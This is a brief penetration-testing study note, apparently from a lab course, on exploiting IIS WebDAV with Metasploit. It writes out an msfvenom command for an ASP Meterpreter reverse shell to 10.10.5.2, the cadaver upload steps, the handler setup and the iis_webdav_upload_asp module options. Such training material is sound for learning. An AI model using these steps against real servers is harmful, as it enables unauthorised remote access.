# Exploiting WebDAV With Metasploit

## Practical Demo

### Manual Exploitation

&#x20;Enumerate the target with "<mark style="color:red;">http-enum</mark>"

Generate ".asp" payload with "<mark style="color:red;">msfvenom</mark>"

* "<mark style="color:yellow;">msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > shell.asp</mark>"

<mark style="color:purple;">NOTE:</mark> When choosing the OS architecture for the payload, if not sure choose 32-Bit since that works either way. For 64-bit targets use "<mark style="color:red;">windows/x64/meterpreter/reverse\_tcp</mark>"

* "<mark style="color:yellow;">cadaver http://targetIP/webdav/</mark>"

Enter credentials

Upload payload file to the server:

* "<mark style="color:yellow;">put 'pathtofile'</mark>"

To receive the  connection we  now need to set up a handler on Metasploit.

* "<mark style="color:yellow;">use multi/handler</mark>"
* "<mark style="color:yellow;">set payload windows/meterpreter/reverse\_tcp</mark>"

<mark style="color:orange;">LHOST AND LPORT HAVE TO BE THE SAME AS IN PAYLOAD</mark>

* "<mark style="color:yellow;">getuid</mark>":  To get privileges

## Using Metasploit Module

Allows to upload a malicios asp file to the web server

"<mark style="color:red;">exploit/windows/iis/iis\_webdav\_upload\_asp</mark>"

* You need to set the credentials in "HttpPassword" "HttpUsername"

Set the path to upload the file to in the webserver:

* "<mark style="color:yellow;">set PATH '/webdav/nametogivefile</mark>'"&#x20;



















